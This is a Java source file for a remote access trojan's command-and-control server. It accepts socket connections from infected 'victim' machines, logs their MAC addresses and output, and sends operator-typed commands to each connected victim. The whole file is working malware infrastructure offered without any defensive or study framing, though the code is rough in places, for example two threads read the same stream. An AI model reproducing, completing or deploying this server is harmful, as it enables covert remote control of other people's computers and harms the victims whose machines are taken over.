package main;

// Server program to handle multiple
// Rats with socket connections
import java.io.*;
import java.net.*;
import java.util.Scanner;
import java.util.concurrent.CopyOnWriteArrayList;

public class Server {
    private static final int PORT = 7845;
    private static CopyOnWriteArrayList<RatHandler> rats = new CopyOnWriteArrayList<>();

    public static void main(String[] args) {
        try {
            ServerSocket serverSocket = new ServerSocket(PORT);
            System.out.println("Server is running and waiting for connections..");

            // Accept incoming connections
            while (true) {
                Socket ratSocket = serverSocket.accept();
                System.out.println("New rat connected: " + ratSocket);

                // Create a new rat handler for the connected rat
                RatHandler ratHandler = new RatHandler(ratSocket);
                rats.add(ratHandler);
                new Thread(ratHandler).start();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    // Broadcast a command to all rats except the sender
    public static void broadcast(String command, RatHandler sender) {
        for (RatHandler rat : rats) {
            if (rat != sender) {
                rat.sendCommand(command);
            }
        }
    }

    // Internal class to handle rat connections
    private static class RatHandler implements Runnable {
        private Socket ratSocket;
        private PrintWriter out;
        private BufferedReader in;
        private String Username; // Use Username consistently

        // Constructor
        public RatHandler(Socket socket) {
            this.ratSocket = socket;

            try {
                // Create input and output streams for communication
                out = new PrintWriter(ratSocket.getOutputStream(), true);
                in = new BufferedReader(new InputStreamReader(ratSocket.getInputStream()));
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

        // Run method to handle rat communication


        @Override
        public void run() {
            new Thread (() -> {
                try {
                    String log = "";
                    while((log = in.readLine()) != null){
                        System.out.println(log);
                    }
                }catch (IOException e) {
                    e.printStackTrace();
                }
            }).start();
            try {
                // Get the username from the rat
                Username = in.readLine(); // Use Username consistently
                System.out.println("RAT victim MAC: " + Username + "."); // Use Username consistently
                String inputLine;
                Scanner scn = new Scanner(System.in);
                // Continue receiving commands from the rat
                while ((inputLine = scn.nextLine()) != null) {
                    sendCommand(inputLine);
                }

                // Remove the rat handler from the list
                rats.remove(this);

                // Close the input and output streams and the rat socket
                in.close();
                out.close();
                ratSocket.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

        // Get the username from the rat
        private String getUsername() throws IOException {
            out.println("Enter your username:");
            return in.readLine();
        }

        public void sendCommand(String command) {
            out.println(command);
//            out.println("Type Your Message");
        }
    }
}

